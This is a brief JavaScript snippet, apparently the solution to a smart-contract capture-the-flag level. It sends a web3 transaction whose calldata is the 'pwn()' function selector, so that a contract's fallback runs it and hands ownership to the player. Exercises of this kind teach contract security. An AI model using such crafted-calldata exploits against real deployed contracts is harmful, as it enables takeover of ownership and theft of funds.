/*
  keccak256("pwn()") = "0xdd365b8b..."
  more info: https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#id84 (data)
  more info: https://docs.soliditylang.org/en/latest/abi-spec.html (examples)
*/

web3.eth.sendTransaction({'from': player, 'to':contract.address, 'data': "0xdd365b8b"}) 
